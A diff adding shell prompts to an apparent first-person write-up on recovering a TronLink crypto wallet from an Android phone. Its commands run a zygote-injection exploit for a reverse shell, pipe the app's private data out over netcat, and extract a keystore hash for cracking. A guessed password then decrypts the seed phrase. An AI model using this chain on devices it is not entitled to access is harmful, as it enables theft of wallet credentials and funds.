@@ -83,7 +83,7 @@ I install the same version of TronLink, generate a test wallet, and start reprod
 I confirm the emulator is visible to `adb`:
 
 ```bash
-adb devices
+$ adb devices
 ```
 
 Output:
@@ -96,7 +96,7 @@ emulator-5554   device
 I get TronLink's UID:
 
 ```bash
-adb shell pm dump com.tronlinkpro.wallet | grep userId
+$ adb shell pm dump com.tronlinkpro.wallet | grep userId
 ```
 
 Output:
@@ -119,7 +119,7 @@ With Gemini's help I tweak `zygote-injection-toolkit` to fix a couple of bugs an
 I put all of this into `repro.py`. It builds the payload with the padding for Android 12+, injects it via `adb shell`, forces Settings to restart to trigger the read, and waits for a netcat listener to come up on localhost. If it works, you get a reverse shell with TronLink's identity. If it fails, it cleans up the setting so the phone isn't left in a bad state.
 
 ```bash
-uv run repro.py --uid 10145 --gid 10145
+$ uv run repro.py --uid 10145 --gid 10145
 ```
 
 Output:
@@ -139,7 +139,7 @@ I replicate it on the real phone. Same steps, same script, and it works. I'm in.
 Instead of going file by file, I compress everything and send it straight to the PC via `netcat`:
 
 ```bash
-printf "tar -czC /data/data/com.tronlinkpro.wallet . | base64; exit\n" | nc 127.0.0.1 1234 | base64 -d > recovery.tar.gz
+$ printf "tar -czC /data/data/com.tronlinkpro.wallet . | base64; exit\n" | nc 127.0.0.1 1234 | base64 -d > recovery.tar.gz
 ```
 
 ![File transfer](file_transfer.gif)
@@ -147,9 +147,9 @@ printf "tar -czC /data/data/com.tronlinkpro.wallet . | base64; exit\n" | nc 127.
 That pulls all the app data: `shared_prefs`, `databases`, everything. To check it arrived correctly:
 
 ```bash
-mkdir -p recovery
-tar -xzf recovery.tar.gz -C recovery
-ls -l recovery/shared_prefs/carlitosmenem991.xml
+$ mkdir -p recovery
+$ tar -xzf recovery.tar.gz -C recovery
+$ ls -l recovery/shared_prefs/carlitosmenem991.xml
 ```
 
 Output:
@@ -191,8 +191,8 @@ To test a candidate you run scrypt, compute the MAC, and compare it against the 
 I write `tools/extract_hash.py` which reads the XML, extracts the keystore JSON and converts it to the format Hashcat understands (mode 15700, Ethereum wallet):
 
 ```bash
-uv run tools/extract_hash.py recovery/shared_prefs/carlitosmenem991.xml > target.hash
-cat target.hash
+$ uv run tools/extract_hash.py recovery/shared_prefs/carlitosmenem991.xml > target.hash
+$ cat target.hash
 ```
 
 Output:
@@ -241,7 +241,7 @@ Nickname + second surname + number. "Turco" + "saul" + "7" = `Turcosaul7`.
 In the repo example, the full run looks like this:
 
 ```bash
-uv run -m smart_recovery run --hash-file target.hash --seed-file note_seeds.json --recovery-root recovery
+$ uv run -m smart_recovery run --hash-file target.hash --seed-file note_seeds.json --recovery-root recovery
 ```
 
 Output:
@@ -258,7 +258,7 @@ With the password in hand, the rest is just a formality. The same password prote
 I write `tools/decrypt_mnemonic.py` which reads the encrypted mnemonic from the XML, decrypts it with the password, and gives you the seed phrase.
 
 ```bash
-uv run tools/decrypt_mnemonic.py recovery/shared_prefs/carlitosmenem991.xml Turcosaul7
+$ uv run tools/decrypt_mnemonic.py recovery/shared_prefs/carlitosmenem991.xml Turcosaul7
 ```
 
 Output:
